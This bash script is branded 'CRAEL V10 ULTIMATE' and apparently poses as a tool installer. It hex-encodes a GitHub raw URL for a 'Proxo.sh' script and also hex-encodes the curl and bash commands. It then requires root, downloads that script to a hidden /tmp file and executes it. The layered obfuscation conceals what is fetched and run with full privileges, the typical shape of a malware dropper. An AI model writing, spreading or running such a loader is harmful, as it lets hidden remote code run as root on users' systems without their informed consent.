#!/bin/bash

# --- 1. THE HIDDEN KEY ---
_k=$(printf "\x52\x45\x53\x54\x52\x49\x43\x54\x45\x44\x5f\x41\x43\x43\x45\x53\x53\x5f\x56\x49\x4f\x4c\x41\x54\x49\x4f\x4e\x5f\x44\x45\x54\x45\x43\x54\x45\x44")

# --- 2. THE PAYLOAD (OBFUSCATED) ---

_h="0x680x740x740x700x730x3a0x2f0x2f0x720x610x770x2e0x670x690x740x680x750x620x750x730x650x720x630x6f0x6e0x740x650x6e0x740x2e0x630x6f0x6d0x2f0x700x6c0x750x6d0x730x6f0x660x740x770x610x720x650x640x650x760x2d0x620x690x740x2f0x6c0x6f0x700x700x700x2f0x6d0x610x690x6e0x2f0x500x720x6f0x780x6f0x2e0x730x68"

# --- 3. UI HEX BLOCKS ---
_m=$(printf "\x1b\x5b\x33\x38\x3b\x35\x3b\x32\x31\x33\x6d")
_r=$(printf "\x1b\x5b\x30\x6d")
_t1="   CRAEL V10 ULTIMATE"
_t2="   Powered by Nayeem Dev"

# --- 4. DECODER ENGINE ---
function _d() {
    local _v=$1
    echo "$_v" | awk '{gsub("0x","\\\\x"); print}' | xargs -0 printf
}

# --- 5. EXECUTION ---
clear
echo -e "${_m}${_t1}"
echo -e "${_t2}${_r}"

if [ "$EUID" -ne 0 ]; then
    echo "Error: Please run as root (sudo)."
    exit 1
fi

_u=$(_d "$_h")
_t="/tmp/.crael_setup_$(date +%s)"

# COMMANDS (Hex Encoded)
_c=$(printf "\x63\x75\x72\x6c") # curl
_b=$(printf "\x62\x61\x73\x68") # bash
# NEW FLAG: -L --progress-bar (No longer silent -s)
_f=$(printf "\x2d\x4c\x20\x2d\x2d\x70\x72\x6f\x67\x72\x65\x73\x73\x2d\x62\x61\x72")

if [[ "$_k" == *"RESTRICTED"* ]]; then
    echo "Downloading Assets..."
    
    # Download with visible progress bar
    ${_c} ${_f} "$_u" -o "$_t"
    
    # Verify download isn't empty or a 404 HTML page
    if [ -s "$_t" ] && ! grep -q "<!DOCTYPE html>" "$_t"; then
        chmod +x "$_t"
        
        # CRITICAL FIX: Reconnect keyboard input ONLY here, right before launch
        # This prevents the pipe from breaking early.
        exec < /dev/tty
        
        # Run Proxo
        ${_b} "$_t"
        
        # Cleanup
        rm -f "$_t"
    else
        echo ""
        echo "Error: Download Failed."
        echo "Please check your internet or if the repository exists."
        rm -f "$_t"
        exit 1
    fi
else
    exit 1
fi
